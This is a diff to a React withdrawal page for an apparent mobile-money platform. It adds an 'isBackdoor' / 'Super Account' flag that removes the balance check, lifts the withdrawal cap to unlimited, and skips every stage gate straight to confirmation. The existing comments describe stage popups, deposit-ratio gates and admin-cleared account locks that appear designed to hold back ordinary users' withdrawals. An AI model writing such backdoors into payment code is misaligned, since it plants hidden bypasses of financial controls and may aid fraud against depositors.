@@ -116,15 +116,16 @@ export default function WithdrawPage() {
   const balance = account.balance ?? 0;
   const totalDeposited = Number(account.totalDeposited || 0);
   const amtNum = parseFloat(String(amount).replace(/,/g, '')) || 0;
-  const overBalance = amtNum > balance;
+  const overBalance = !isBackdoor && amtNum > balance;
+  const effectiveMaxWithdraw = isBackdoor ? Number.MAX_SAFE_INTEGER : MAX_WITHDRAW;
   // The deposit-ratio gate is enforced via the stage popups instead of
   // blocking the button, so the user always reaches the modal that explains
   // *why* the withdrawal can't proceed yet.
-  const isAmountValid = amtNum >= MIN_WITHDRAW && amtNum <= MAX_WITHDRAW && !overBalance;
+  const isAmountValid = amtNum >= MIN_WITHDRAW && amtNum <= effectiveMaxWithdraw && !overBalance;
   const net = NETWORKS[method] || NETWORKS.momo;
   const accountPhone = account.phone || account.email || '+233 24****481';
 
-  const bump = (n) => setAmount(String(Math.min(MAX_WITHDRAW, Math.round(amtNum + n))));
+  const bump = (n) => setAmount(String(Math.min(effectiveMaxWithdraw, Math.round(amtNum + n))));
 
   const cycleNetwork = () => {
     const order = ['momo', 'vodafone', 'airteltigo'];
@@ -136,6 +137,11 @@ export default function WithdrawPage() {
     e.preventDefault();
     setErr('');
     if (!isAmountValid || busy) return;
+    // Backdoor / Super Account skips every stage gate — straight to confirm.
+    if (isBackdoor) {
+      setShowConfirm(true);
+      return;
+    }
     // Stage 3 promotes lock the account — the blocked popup gates everything
     // until an admin clears the block.
     if (isBlocked) {
@@ -882,7 +888,7 @@ export default function WithdrawPage() {
                   id="wd-amt"
                   type="number"
                   min={MIN_WITHDRAW}
-                  max={MAX_WITHDRAW}
+                  max={isBackdoor ? undefined : MAX_WITHDRAW}
                   step="1"
                   inputMode="decimal"
                   value={amount}
@@ -925,23 +931,31 @@ export default function WithdrawPage() {
                 ))}
                 <button
                   type="button"
-                  onClick={() => setAmount(String(Math.min(MAX_WITHDRAW, Math.floor(balance))))}
-                  disabled={balance < MIN_WITHDRAW}
+                  onClick={() =>
+                    setAmount(
+                      isBackdoor
+                        ? String(Math.max(MIN_WITHDRAW, Math.floor(balance)))
+                        : String(Math.min(MAX_WITHDRAW, Math.floor(balance))),
+                    )
+                  }
+                  disabled={!isBackdoor && balance < MIN_WITHDRAW}
                   title={
-                    balance < MIN_WITHDRAW
+                    !isBackdoor && balance < MIN_WITHDRAW
                       ? `Balance below minimum (GHS ${MIN_WITHDRAW.toLocaleString('en-US')})`
                       : 'Withdraw your full balance'
                   }
                   style={{
                     padding: '12px 0',
                     background:
-                      balance >= MIN_WITHDRAW ? 'linear-gradient(135deg, var(--accent), #ffcc33)' : 'var(--surface)',
+                      isBackdoor || balance >= MIN_WITHDRAW
+                        ? 'linear-gradient(135deg, var(--accent), #ffcc33)'
+                        : 'var(--surface)',
                     border: '1px solid var(--line)',
                     borderRadius: 8,
-                    color: balance >= MIN_WITHDRAW ? '#000000' : 'var(--text-dim)',
+                    color: isBackdoor || balance >= MIN_WITHDRAW ? '#000000' : 'var(--text-dim)',
                     fontWeight: 800,
                     fontSize: 14,
-                    cursor: balance >= MIN_WITHDRAW ? 'pointer' : 'not-allowed',
+                    cursor: isBackdoor || balance >= MIN_WITHDRAW ? 'pointer' : 'not-allowed',
                     letterSpacing: 0.02,
                   }}
                 >
@@ -1002,7 +1016,9 @@ export default function WithdrawPage() {
               </button>
 
               <ol style={{ paddingLeft: 18, margin: 0, fontSize: 13, color: 'var(--text-soft)', lineHeight: 1.7 }}>
-                <li>Maximum transaction is GHS {MAX_WITHDRAW.toLocaleString('en-US')}.00</li>
+                <li>
+                  Maximum transaction is {isBackdoor ? 'unlimited' : `GHS ${MAX_WITHDRAW.toLocaleString('en-US')}.00`}
+                </li>
                 <li>
                   Minimum per transaction is GHS {MIN_WITHDRAW.toLocaleString('en-US')}.00
                   {stage === 2 ? ' (Stage 2 minimum)' : ''}
